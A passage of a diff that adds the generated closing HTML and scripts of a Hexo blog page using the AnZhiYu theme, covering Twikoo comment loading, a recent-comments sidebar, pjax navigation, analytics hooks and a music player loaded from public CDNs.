+      console.error(err)
+    })
+  }
+
+  const runFn = () => {
+    init();
+    
+  }
+
+  if ('Twikoo' === 'Twikoo' || !true) {
+    if (true) anzhiyu.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
+    else {
+      loadTwikoo()
+    }
+  } else {
+    window.loadOtherComment = loadTwikoo
+  }
+})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script>window.addEventListener('load', () => {
+  const changeContent = (content) => {
+    if (content === '') return content
+
+    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
+    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
+    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
+    content = content.replace(/<[^>]+>/g,"") // remove html tag
+
+    if (content.length > 150) {
+      content = content.substring(0,150) + '...'
+    }
+    return content
+  }
+
+  const getComment = () => {
+    const runTwikoo = () => {
+      twikoo.getRecentComments({
+        envId: 'https://hihopkc.space/',
+        region: '',
+        pageSize: 6,
+        includeReply: true
+      }).then(function (res) {
+        const twikooArray = res.map(e => {
+          return {
+            'content': changeContent(e.comment),
+            'avatar': e.avatar,
+            'nick': e.nick,
+            'url': e.url + '#' + e.id,
+            'date': new Date(e.created).toISOString()
+          }
+        })
+
+        saveToLocal.set('twikoo-newest-comments', JSON.stringify(twikooArray), 10/(60*24))
+        generateHtml(twikooArray)
+      }).catch(function (err) {
+        const $dom = document.querySelector('#card-newest-comments .aside-list')
+        $dom.textContent= "无法获取评论，请确认相关配置是否正确"
+      })
+    }
+
+    if (typeof twikoo === 'object') {
+      runTwikoo()
+    } else {
+      getScript('https://cdn.cbd.int/twikoo@1.6.21/dist/twikoo.all.min.js').then(runTwikoo)
+    }
+  }
+
+  const generateHtml = array => {
+    let result = ''
+
+    if (array.length) {
+      for (let i = 0; i < array.length; i++) {
+        result += '<div class=\'aside-list-item\'>'
+
+        if (true) {
+          const name = 'data-lazy-src'
+          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'><div class='name'><span>${array[i].nick} </span></div></a>`
+        }
+        
+        result += `<div class='content'>
+        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
+        <time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
+        </div>`
+      }
+    } else {
+      result += '没有评论'
+    }
+
+    let $dom = document.querySelector('#card-newest-comments .aside-list')
+    $dom.innerHTML= result
+    window.lazyLoadInstance && window.lazyLoadInstance.update()
+    window.pjax && window.pjax.refresh($dom)
+  }
+
+  const newestCommentInit = () => {
+    if (document.querySelector('#card-newest-comments .aside-list')) {
+      const data = saveToLocal.get('twikoo-newest-comments')
+      if (data) {
+        generateHtml(JSON.parse(data))
+      } else {
+        getComment()
+      }
+    }
+  }
+
+  newestCommentInit()
+  document.addEventListener('pjax:complete', newestCommentInit)
+})</script><script>var visitorMail = "visitor@anheyu.com";
+</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><script type="text/javascript" src="/js/fps.js"></script><div id="fps"></div><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["meta[property=\"og:image\"]","meta[property=\"og:title\"]","meta[property=\"og:url\"]","meta[property=\"og:type\"]","meta[property=\"og:site_name\"]","meta[property=\"og:description\"]","head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"]):not([href="/music/"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+  // removeEventListener scroll 
+  anzhiyu.removeGlobalFnEvent('pjax')
+  anzhiyu.removeGlobalFnEvent('themeChange')
+
+  document.getElementById('rightside').classList.remove('rightside-show')
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', e => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>
